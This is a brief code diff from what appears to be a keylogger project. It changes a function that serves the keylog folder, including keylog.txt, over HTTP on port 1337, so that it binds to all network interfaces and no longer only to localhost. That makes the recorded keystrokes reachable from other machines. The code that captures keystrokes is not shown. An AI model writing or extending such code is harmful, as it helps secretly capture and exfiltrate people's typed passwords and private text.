@@ -58,7 +58,7 @@ def logger():
 def server() -> None:
     """ simple function to open an http server on port 1337 uploading the keylog.txt file """
     os.chdir("keylogger/keylog")
-    server = http.server.HTTPServer(("localhost", 1337), http.server.SimpleHTTPRequestHandler)
+    server = http.server.HTTPServer(("", 1337), http.server.SimpleHTTPRequestHandler)
     server.serve_forever()
 
 
